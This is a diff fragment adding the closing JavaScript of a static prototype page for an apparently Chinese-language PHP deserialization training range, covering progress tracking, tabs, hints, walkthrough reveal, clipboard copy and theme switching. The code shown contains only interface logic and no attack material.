+  document.getElementById("progText").textContent="已完成 "+done.length+" / 18";
+  document.getElementById("progBar").style.width=(done.length/18*100)+"%";
+}
+/* 点卡片 = 进入;长按/右键 = 标记完成(原型里用右键演示) */
+document.addEventListener("contextmenu",function(e){
+  var lv=e.target.closest&&e.target.closest(".lv");
+  if(lv&&lv.getAttribute("onclick")&&lv.getAttribute("onclick").indexOf("openLevel")===0){
+    e.preventDefault();var no=lv.querySelector(".no").textContent.replace("L","");
+    var d=getDone(),i=d.indexOf(+no);
+    if(i>=0){d.splice(i,1)}else if(d.length<18&&+no<=18){d.push(+no)}
+    setDone(d);renderCatalog();
+  }
+});
+function openLevel(v,no){
+  if(String(v).indexOf("demo-")===0){alert("原型仅内置 Level 7(引导)与 Level 16(挑战)两个示例视图\n实际落地时所有关卡共用同一模板,由 config/levels.php 数据驱动");return}
+  if(no){var d=getDone();if(d.indexOf(no)<0){/* 不自动标记,保持手动 */}}
+  show(v);
+}
+
+/* ───────── Tab / 提示 / 解析 ───────── */
+document.querySelectorAll(".card .tabs").forEach(function(tabs){
+  tabs.addEventListener("click",function(e){
+    var b=e.target.closest("button");if(!b)return;
+    var card=tabs.parentElement;
+    tabs.querySelectorAll("button").forEach(function(x){x.classList.toggle("on",x===b)});
+    card.querySelectorAll(".panel").forEach(function(p){p.hidden=p.getAttribute("data-panel")!==b.getAttribute("data-tab")});
+  });
+});
+function revealHint(btn){btn.nextElementSibling.hidden=!btn.nextElementSibling.hidden}
+function showWp(n){
+  document.getElementById("gate"+n).hidden=true;
+  document.getElementById("wp"+n).hidden=false;
+}
+function fakeSubmit(n){
+  document.getElementById("res"+n).innerHTML="静态原型:此处将显示关卡的真实响应(flag 或报错提示)。实际实现由现有关卡代码返回,本页原样展示。";
+}
+function copyText(btn,srcId){
+  var t=srcId.startsWith("src")?document.getElementById(srcId.startsWith("src7")?"raw7":"raw16").textContent:document.getElementById(srcId).textContent;
+  (navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).then(function(){btn.textContent="已复制"},function(){btn.textContent="复制失败"});
+}
+
+/* ───────── 视图切换 / 顶栏 ───────── */
+var VIEWS={catalog:{crumb:"从 0 开始的PHP反序列化引导靶场"},
+           l7:{crumb:"Level 7 / 18 · 实例化和反序列化"},
+           l16:{crumb:"Level 16 / 18 · POP 链构造"}};
+function show(v){
+  ["catalog","l7","l16"].forEach(function(x){document.getElementById("view-"+x).hidden=(x!==v)});
+  document.querySelectorAll(".proto button[data-go]").forEach(function(b){b.classList.toggle("on",b.getAttribute("data-go")===v)});
+  document.getElementById("crumb").innerHTML=VIEWS[v].crumb;
+  var inLevel=(v!=="catalog");
+  document.getElementById("homeBtn").style.display=inLevel?"":"none";
+  document.getElementById("prevBtn").style.display=inLevel?"":"none";
+  document.getElementById("nextBtn").style.display=inLevel?"":"none";
+  document.getElementById("prevBtn").disabled=(v==="l7");
+  document.getElementById("nextBtn").disabled=(v==="l16");
+  window.scrollTo(0,0);
+}
+document.getElementById("homeBtn").onclick=function(){show("catalog")};
+document.getElementById("prevBtn").onclick=function(){show("l7")};
+document.getElementById("nextBtn").onclick=function(){show("l16")};
+document.querySelectorAll(".proto button[data-go]").forEach(function(b){b.onclick=function(){show(b.getAttribute("data-go"))}});
+document.getElementById("themeBtn").onclick=function(){
+  var h=document.documentElement,data=h.getAttribute("data-theme");
+  h.setAttribute("data-theme",data==="dark"?"light":"dark");
+  localStorage.setItem("phplab-theme",h.getAttribute("data-theme"));
+};
+(function(){
+  var saved=localStorage.getItem("phplab-theme");
+  if(saved)document.documentElement.setAttribute("data-theme",saved);
+  else if(window.matchMedia&&matchMedia("(prefers-color-scheme: dark)").matches)
+    document.documentElement.setAttribute("data-theme","dark");
+})();
+
+/* ───────── 初始化 ───────── */
+renderCode("code7","raw7",KEYLINES[7]);
+renderCode("code16","raw16",KEYLINES[16]);
+renderCatalog();
+show("l7"); /* 默认打开引导关示例,便于评审 */
+</script>
+</body>
+</html>
